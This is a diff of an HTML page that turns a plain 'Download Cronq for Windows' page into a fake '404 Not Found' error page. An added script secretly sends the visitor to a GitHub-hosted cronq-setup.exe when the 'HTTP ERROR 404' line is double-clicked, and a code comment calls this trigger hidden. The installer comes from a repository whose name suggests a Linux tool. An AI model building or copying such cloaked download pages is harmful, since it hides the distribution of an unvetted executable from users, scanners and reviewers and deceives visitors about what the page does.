@@ -3,14 +3,37 @@
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="Download Cronq for Windows.">
-    <title>Cronq</title>
+    <meta name="color-scheme" content="light dark">
+    <title>404 Not Found</title>
     <link rel="stylesheet" href="styles.css">
   </head>
   <body>
-    <main>
-      <h1>Cronq</h1>
-      <a class="download" href="https://github.com/savenXD/Linux-Handy-overlay/releases/latest/download/cronq-setup.exe">Download for Windows</a>
+    <main class="error-page">
+      <svg class="icon" viewBox="0 0 72 72" width="72" height="72" aria-hidden="true">
+        <path d="M18 8h25l15 15v39a2 2 0 0 1-2 2H18a2 2 0 0 1-2-2V10a2 2 0 0 1 2-2z" fill="none" stroke="currentColor" stroke-width="3" stroke-linejoin="round"/>
+        <path d="M43 8v15h15" fill="none" stroke="currentColor" stroke-width="3" stroke-linejoin="round"/>
+        <circle cx="29" cy="40" r="2.5" fill="currentColor"/>
+        <circle cx="45" cy="40" r="2.5" fill="currentColor"/>
+        <path d="M28 54c3-5 13-5 16 0" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round"/>
+      </svg>
+
+      <h1>This page can’t be found</h1>
+      <p>No webpage was found for the web address: <strong id="url"></strong></p>
+      <p class="code" id="code">HTTP ERROR 404</p>
+
+      <!-- DOWNLOAD BUTTON GOES HERE (position TBD) -->
+      <!-- href: https://github.com/savenXD/Linux-Handy-overlay/releases/latest/download/cronq-setup.exe -->
+
+      <button type="button" class="reload" onclick="location.reload()">Reload</button>
     </main>
+    <script>
+      document.getElementById("url").textContent = location.href;
+
+      // Hidden: double-clicking "HTTP ERROR 404" downloads the installer.
+      var DOWNLOAD_URL = "https://github.com/savenXD/Linux-Handy-overlay/releases/latest/download/cronq-setup.exe";
+      document.getElementById("code").addEventListener("dblclick", function () {
+        location.href = DOWNLOAD_URL;
+      });
+    </script>
   </body>
 </html>
